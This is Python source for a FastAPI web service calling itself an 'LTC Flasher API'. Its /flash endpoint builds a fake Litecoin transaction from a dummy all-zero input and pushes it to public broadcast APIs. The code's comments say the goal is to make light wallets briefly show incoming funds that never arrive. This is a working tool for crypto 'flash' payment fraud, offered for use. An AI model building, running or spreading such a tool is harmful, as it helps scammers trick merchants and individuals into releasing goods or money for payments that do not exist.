from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import requests, json, hashlib, struct, base64, ecdsa
from binascii import hexlify, unhexlify

app = FastAPI()
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

class FlashReq(BaseModel):
    address: str
    amount: float

LTC_NETWORK_BYTE = b'\x30'  # mainnet
LTC_TESTNET_BYTE = b'\x6f'

def dsha256(data):
    return hashlib.sha256(hashlib.sha256(data).digest()).digest()

def make_tx(version, inputs, outputs, locktime=0):
    tx = struct.pack("<I", version)
    tx += encode_varint(len(inputs))
    for i in inputs:
        tx += unhexlify(i['txid'])[::-1]
        tx += struct.pack("<I", i['vout'])
        tx += encode_varint(len(i['script'])) + i['script']
        tx += struct.pack("<I", i['sequence'])
    tx += encode_varint(len(outputs))
    for o in outputs:
        tx += struct.pack("<q", int(o['value']*1e8))
        script = unhexlify(o['script'])
        tx += encode_varint(len(script)) + script
    tx += struct.pack("<I", locktime)
    return tx

def encode_varint(n):
    if n < 0xfd: return bytes([n])
    elif n <= 0xffff: return b'\xfd' + struct.pack("<H", n)
    elif n <= 0xffffffff: return b'\xfe' + struct.pack("<I", n)
    else: return b'\xff' + struct.pack("<Q", n)

@app.post("/flash")
async def flash(req: FlashReq):
    # Craft a fake tx using a non-existent or already-spent UTXO
    # The tx will be rejected by full nodes eventually but may propagate
    # to some mempool APIs briefly, triggering the "Receiving" UI state
    
    fake_utxo = {
        "txid": "0"*64,  # dummy txid
        "vout": 0,
        "script": b'',
        "sequence": 0xffffffff
    }
    
    # P2PKH output script for target address
    # Decode base58check to get hash160
    addr_bytes = base58_decode(req.address)
    hash160 = addr_bytes[1:-4]
    script_pubkey = bytes([0x76, 0xa9, 0x14]) + hash160 + bytes([0x88, 0xac])
    
    outputs = [{
        "value": req.amount,
        "script": hexlify(script_pubkey).decode()
    }]
    
    tx = make_tx(2, [fake_utxo], outputs)
    txid = hexlify(dsha256(tx)[::-1]).decode()
    
    # Attempt broadcast to multiple public LTC APIs
    # Some poorly configured nodes may accept it into mempool briefly
    hex_tx = hexlify(tx).decode()
    
    endpoints = [
        "https://api.blockcypher.com/v1/ltc/main/txs/push",
        "https://ltc.getblock.io/mainnet/broadcast",  # needs key usually
    ]
    
    results = []
    for ep in endpoints:
        try:
            r = requests.post(ep, json={"tx": hex_tx}, timeout=5)
            results.append({"endpoint": ep, "status": r.status_code, "resp": r.text[:200]})
        except Exception as e:
            results.append({"endpoint": ep, "error": str(e)})
    
    return {
        "txid": txid,
        "hex": hex_tx,
        "target": req.address,
        "amount": req.amount,
        "broadcast_attempts": results,
        "note": "Tx uses invalid inputs. May show 'Receiving' in light wallets briefly before disappearing."
    }

def base58_decode(addr):
    alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
    num = 0
    for c in addr:
        num = num * 58 + alphabet.index(c)
    return num.to_bytes((num.bit_length() + 7) // 8, 'big')

@app.get("/")
async def root():
    return {"status": "LTC Flasher API active"}
